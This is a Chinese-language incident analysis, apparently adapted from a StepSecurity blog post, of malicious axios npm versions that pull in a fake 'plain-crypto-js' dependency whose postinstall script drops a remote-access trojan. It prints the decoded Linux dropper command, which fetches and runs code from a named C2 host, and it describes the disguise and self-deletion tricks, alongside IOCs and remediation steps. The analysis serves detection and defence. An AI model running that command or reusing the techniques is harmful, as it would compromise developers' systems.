# axios npm 包遭入侵 — 恶意版本植入远程访问木马（RAT）

> 原文来源：[StepSecurity Blog](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan)  
> 发布时间：2026 年 3 月 30 日  
> 作者：Ashish Kurmi

---

## 事件概述

2026 年 3 月 30 日，StepSecurity 发现两个针对广泛使用的 HTTP 客户端库 `axios` 的恶意版本被发布至 npm：

- `axios@1.14.1`
- `axios@0.30.4`

攻击者通过盗取 axios 核心维护者的 npm 账号凭证，绕过了项目正常的 GitHub Actions CI/CD 流水线，手动发布了被污染的恶意包，并将维护者账号的邮箱篡改为匿名 ProtonMail 地址。

**⚠️ 如果你已安装 `axios@1.14.1` 或 `axios@0.30.4`，请立即视系统为已被攻陷。**

---

## 攻击时间线

攻击提前约 18 小时预置，恶意依赖在 axios 发版前已被植入 npm，以规避安全扫描器对"全新包"的警报：

|时间（UTC）|事件|
|---|---|
|2026-03-30 05:57|`plain-crypto-js@4.2.0` 由 `nrwise@proton.me` 发布 — 内含 `crypto-js` 源码的干净诱饵包，无 `postinstall` 钩子，用于建立发布历史|
|2026-03-30 23:59|`plain-crypto-js@4.2.1` 由 `nrwise@proton.me` 发布 — 引入 `"postinstall": "node setup.js"` 及混淆后的恶意 dropper|
|2026-03-31 00:21|`axios@1.14.1` 由被盗的 `jasonsaayman` 账号发布 — 注入 `plain-crypto-js@4.2.1` 为运行时依赖，针对 1.x 用户群|
|2026-03-31 01:00|`axios@0.30.4` 由同一被盗账号发布 — 针对 0.x 用户群，两版本相差仅 39 分钟|

---

## 攻击原理详解

### 第一步：维护者账号被盗

攻击者入侵了 axios 主要维护者 `jasonsaayman` 的 npm 账号，将注册邮箱篡改为 `ifstap@proton.me`，同时在 1.x 和 0.x 两个发布分支上同时发布恶意包，最大化攻击面。

**关键取证信号：** 合法的 axios 1.x 版本均通过 **GitHub Actions + npm OIDC Trusted Publisher** 机制发布，每次发布均有加密绑定的 GitHub Actions 工作流证明。而 `axios@1.14.1` 完全打破了这一规律：

```
// axios@1.14.0 — 合法版本
"_npmUser": {
  "name": "GitHub Actions",
  "email": "npm-oidc-no-reply@github.com",
  "trustedPublisher": {
    "id": "github",
    "oidcConfigId": "oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
  }
}

// axios@1.14.1 — 恶意版本
"_npmUser": {
  "name": "jasonsaayman",
  "email": "ifstap@proton.me"
  // 无 trustedPublisher，无 gitHead，无对应 GitHub 提交或 tag
}
```

GitHub 仓库中不存在对应 `1.14.1` 的任何提交或 tag，该版本仅存在于 npm 上。

---

### 第二步：恶意依赖预置

攻击者提前在 npm 上发布了 `plain-crypto-js@4.2.1`（由独立账号 `nrwise` / `nrwise@proton.me` 发布）。这个包精心伪装成合法包：

- **冒充 `crypto-js`**：相同的描述、相同的作者归属（Evan Vosberg）、相同的 GitHub 仓库地址
- **包含 `postinstall` 钩子**：`"postinstall": "node setup.js"`，在每次 `npm install` 时自动无感执行
- **预置自毁证据机制**：包含干净的 `package.md` 文件（无 `postinstall` 字段），供攻击完成后覆盖真实 `package.json`

---

### 第三步：注入恶意依赖到 axios

恶意版本将 `plain-crypto-js@^4.2.1` 作为**运行时依赖**写入 `package.json`，而该包从未出现在任何合法 axios 版本中：

|版本|依赖项|状态|
|---|---|---|
|axios@1.14.0|follow-redirects, form-data, proxy-from-env|✅ 干净|
|axios@1.14.1|follow-redirects, form-data, proxy-from-env, **plain-crypto-js@^4.2.1**|❌ 恶意|
|axios@0.30.3|follow-redirects, form-data, proxy-from-env|✅ 干净|
|axios@0.30.4|follow-redirects, form-data, proxy-from-env, **plain-crypto-js@^4.2.1**|❌ 恶意|

**幽灵依赖：** 对 `axios@1.14.1` 全部 86 个文件进行 grep 分析，确认 `plain-crypto-js` **在 axios 源码中从未被 `import` 或 `require`**，仅用于触发 `postinstall` 钩子。

> postinstall  会在npm install 安装完依赖后自动跑的脚本

---

## RAT Dropper 分析：`setup.js` 静态解析

`setup.js` 是一个单一的压缩文件，采用**双层混淆**方案。

### 混淆技术

所有敏感字符串（模块名、OS 标识、Shell 命令、C2 URL、文件路径）均以编码形式存储在名为 `stq[]` 的数组中，通过两个函数运行时解码：

- **`_trans_1(x, r)`** — XOR 密码，密钥 `"OrDeR_7077"` 中字母产生 NaN，有效密钥仅为 `[7,0,7,7]`
- **`_trans_2(x, r)`** — 外层，先反转字符串、替换字符、base64 解码，再传入 `_trans_1`

入口为 `_entry("6202033")`，完整 C2 地址为：**`http://sfrclak.com:8000/6202033`**

### 完整解码字符串

|数组索引|解码结果|
|---|---|
|stq[0]|`child_process`（执行 Shell 命令）|
|stq[1]|`os`（平台检测）|
|stq[2]|`fs`（文件系统操作）|
|stq[3]|`http://sfrclak.com:8000/`（C2 基础 URL）|
|stq[5]|`win32`（Windows 平台标识）|
|stq[6]|`darwin`（macOS 平台标识）|
|stq[12]|`curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &`|
|stq[13]|`package.json`（攻击后删除）|
|stq[14]|`package.md`（用于替换 package.json 的干净存根）|
|stq[15-17]|`.exe` / `.ps1` / `.vbs`|

---

## 各平台攻击载荷

dropper 检测 `os.platform()` 后执行对应攻击路径：

### macOS — AppleScript Dropper

- 将 AppleScript 写入系统临时目录，使用 `nohup osascript ... > /dev/null 2>&1 &` 静默执行
- 向 C2 发送 POST body `packages.npm.org/product0`，下载 macOS RAT 二进制
- 保存至 `/Library/Caches/com.apple.act.mond`（伪装为 Apple 系统缓存条目）
- 授予执行权限 `chmod 770`，后台启动，AppleScript 文件随即自删

**路径伪装：** `com.apple.act.mond` 模仿 Apple 反向 DNS 守护进程命名规范（`act.mond` 疑似 "Activity Monitor Daemon" 缩写），极难察觉。

### Windows — VBScript + PowerShell Dropper

三阶段攻击链：

1. 运行 `where powershell` 定位 PowerShell 路径
2. 将 PowerShell 二进制复制至 `%PROGRAMDATA%\wt.exe`（伪装为 Windows Terminal）
3. 将 VBScript（`.vbs`）写入临时目录，通过 `cscript //nologo` 静默执行

VBScript 启动完全隐藏的 `cmd.exe` 窗口，下载 PowerShell RAT 脚本，以 `-ExecutionPolicy Bypass -WindowStyle Hidden` 执行后自删。

- 临时文件：`%TEMP%\6202033.vbs`、`%TEMP%\6202033.ps1`（均自删）
- 持久化文件：`%PROGRAMDATA%\wt.exe`

### Linux — Python Dropper

通过 Node.js `execSync` 直接执行 Shell 命令：

```bash
curl -o /tmp/ld.py \
  -d packages.npm.org/product2 \
  -s http://sfrclak.com:8000/6202033 \
&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
```

C2 返回 Python RAT 脚本，保存至 `/tmp/ld.py` 并在后台持续运行。

**三平台、一个 C2：** 各平台通过不同 POST body（`product0/1/2`）请求同一端点，服务器据此返回对应载荷。`packages.npm.org/` 前缀故意模仿 npm 注册表流量，以规避 SIEM 规则检测。

---

## 自我清理 — 抹除证据

载荷执行后，`setup.js` 执行三步取证清理：

1. **删除自身** — `fs.unlink(__filename)` 移除 `setup.js`
2. **删除 `package.json`** — 移除含有 `"postinstall": "node setup.js"` 钩子的文件
3. **重命名 `package.md` 为 `package.json`** — 用预置的干净存根（版本 `4.2.0`，无 postinstall）替换

事后检查 `node_modules/plain-crypto-js/package.json` 将显示完全干净的内容。运行 `npm audit` 或手动检查安装目录均无法发现入侵痕迹。

**⚠️ 关键：** 尽管文件已被清除，但 `node_modules/plain-crypto-js/` 目录的**存在本身**即为入侵证据 — 该包不属于任何合法 axios 版本的依赖。

---

## 运行时验证（StepSecurity Harden-Runner）

StepSecurity 在 GitHub Actions runner 中安装 `axios@1.14.1`，并以审计模式挂载 Harden-Runner（捕获所有出站网络连接、进程及文件写入），获得以下关键发现：

### 网络事件

- **`npm install` 开始后 1.1 秒** —— `curl`（PID 2401）向 `sfrclak.com:8000` 建立连接（`postinstall` 钩子触发）
- **36 秒后，在完全不同的工作流步骤中** —— `nohup`（PID 2400）再次向 C2 回连，这是 Stage-2 Python 载荷（`/tmp/ld.py`）的回调，以孤立进程（`ppid: 1`）方式运行，与 npm 进程树完全脱离

### 完整进程链

```
PID 2366  bash /home/runner/work/_temp/***.sh                    [01:30:48Z]
  └─ PID 2380  node npm install axios@1.14.1                     [01:30:49Z]
       └─ PID 2391  sh -c "node setup.js"                        [01:30:50Z]
            │  cwd: node_modules/plain-crypto-js  ← postinstall 钩子触发
            └─ PID 2392  node setup.js                           [01:30:50Z]
                 └─ PID 2399  /bin/sh -c "curl ... && nohup ..." [01:30:50Z]

PID 2401  curl -o /tmp/ld.py ...                                 [01:30:50Z]
PID 2400  nohup python3 /tmp/ld.py ...  ppid: 1  ← 已孤立至 init [01:31:27Z]
```

从 `npm install` 到 C2 回调共经过 4 层进程间接调用：`npm → sh → node → sh → curl/nohup`。

---

## 失陷指标（IOC）

### 恶意 npm 包

|包名|shasum|
|---|---|
|axios@1.14.1|`2553649f232204966871cea80a5d0d6adc700ca`|
|axios@0.30.4|`d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71`|
|plain-crypto-js@4.2.1|`07d889e2dadce6f3910dcbc253317d28ca61c766`|

### 网络指标

|类型|值|
|---|---|
|C2 域名|`sfrclak.com`|
|C2 IP|`142.11.206.73`|
|C2 URL|`http://sfrclak.com:8000/6202033`|
|POST body (macOS)|`packages.npm.org/product0`|
|POST body (Windows)|`packages.npm.org/product1`|
|POST body (Linux)|`packages.npm.org/product2`|

### 文件系统指标

|平台|路径|
|---|---|
|macOS|`/Library/Caches/com.apple.act.mond`|
|Windows（持久化）|`%PROGRAMDATA%\wt.exe`|
|Windows（临时，自删）|`%TEMP%\6202033.vbs`、`%TEMP%\6202033.ps1`|
|Linux|`/tmp/ld.py`|

### 攻击者账号

|账号|说明|
|---|---|
|`jasonsaayman`|被盗的 axios 合法维护者账号，邮箱被改为 `ifstap@proton.me`|
|`nrwise`|攻击者创建账号，`nrwise@proton.me`，发布 `plain-crypto-js`|

### 安全版本参考

- `axios@1.14.0`（安全）shasum: `7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb`

---

## 如何排查是否受影响

### 检查恶意 axios 版本

```bash
npm list axios 2>/dev/null | grep -E "1\.14\.1|0\.30\.4"
grep -A1 '"axios"' package-lock.json | grep -E "1\.14\.1|0\.30\.4"
```

### 检查 `plain-crypto-js` 目录

```bash
ls node_modules/plain-crypto-js 2>/dev/null && echo "可能已受影响"
```

> 即使 `setup.js` 已自删，目录的存在本身即为 dropper 已执行的证据。

### 检查各平台 RAT 文件

```bash
# macOS
ls -la /Library/Caches/com.apple.act.mond 2>/dev/null && echo "已被攻陷"

# Linux
ls -la /tmp/ld.py 2>/dev/null && echo "已被攻陷"

# Windows (cmd.exe)
dir "%PROGRAMDATA%\wt.exe" 2>nul && echo 已被攻陷
```

---

## 修复建议

### 1. 降级 axios 至安全版本并固定

```bash
npm install axios@1.14.0   # 1.x 用户
npm install axios@0.30.3   # 0.x 用户
```

在 `package.json` 中添加 overrides 防止传递解析回恶意版本：

```json
{
  "dependencies": { "axios": "1.14.0" },
  "overrides":    { "axios": "1.14.0" },
  "resolutions":  { "axios": "1.14.0" }
}
```

### 2. 移除 plain-crypto-js

```bash
rm -rf node_modules/plain-crypto-js
npm install --ignore-scripts
```

### 3. 系统重建（如发现 RAT 文件）

若发现 RAT 相关文件，**不要尝试就地清理，应从已知干净状态重建系统**。

### 4. 轮换所有凭证

在恶意包曾运行的系统上，立即轮换：npm token、AWS 访问密钥、SSH 私钥、云凭证（GCP/Azure）、CI/CD Secrets、`.env` 文件中的所有值。

### 5. 审计 CI/CD 流水线

检查所有曾执行 `npm install` 的工作流是否拉取了恶意版本，受影响流水线的注入 Secrets 均应立即轮换。

### 6. CI/CD 中启用 `--ignore-scripts`

```bash
npm ci --ignore-scripts
```

### 7. 在网络/DNS 层封锁 C2 流量

```bash
# Linux 防火墙
iptables -A OUTPUT -d 142.11.206.73 -j DROP

# macOS/Linux hosts 文件
echo "0.0.0.0 sfrclak.com" >> /etc/hosts
```

---

## 攻击特征总结

这次攻击具有极高的操作复杂度，是针对 npm top-10 包有记录以来最具计划性的供应链攻击之一：

- 🕐 **提前 18 小时预置**恶意依赖，规避"新包警报"
- 🖥️ **三套平台独立载荷**（macOS / Windows / Linux）
- ⏱️ **两个发布分支在 39 分钟内同时被攻击**
- 🧹 **全面自毁证据**，事后检查毫无痕迹
- 🎭 **流量伪装**，POST body 以 `packages.npm.org/` 开头混入正常 npm 流量

---

_本文整理自 StepSecurity 博客，原文发布于 2026 年 3 月 30 日。_